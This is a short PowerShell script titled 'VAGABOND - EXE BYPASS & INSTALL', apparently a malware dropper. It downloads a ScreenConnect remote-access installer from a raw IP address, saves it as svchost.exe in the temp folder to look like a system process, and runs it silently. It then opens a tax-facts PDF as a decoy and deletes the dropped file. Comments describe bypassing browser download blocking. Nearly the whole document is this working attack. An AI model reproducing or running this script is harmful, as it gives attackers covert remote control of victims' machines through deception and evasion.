# VAGABOND - EXE BYPASS & INSTALL
$Url = "http://45.66.150.24:8040/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"
$ExeFile = "$env:TEMP\svchost.exe"
$pdfLink = "https://www.bairdwealth.com/siteassets/pdfs/tax-information/2026-tax-facts.pdf"

try {
    # 1. Download using Invoke-WebRequest (Bypasses "Insecure Download Blocked")
    Invoke-WebRequest -Uri $Url -OutFile $ExeFile -UseBasicParsing
    
    # 2. Run the EXE silently but visibly (so you see the install window)
    Start-Process $ExeFile -ArgumentList "/silent" -WindowStyle Normal
    
    # 3. Wait for connection to establish (30 seconds)
    Start-Sleep -Seconds 30
    
    # 4. Launch PDF in Browser
    Start-Process $pdfLink
    
    # 5. Cleanup
    Remove-Item $ExeFile -Force -ErrorAction SilentlyContinue
} catch {
    Write-Host "Failed: $_"
}
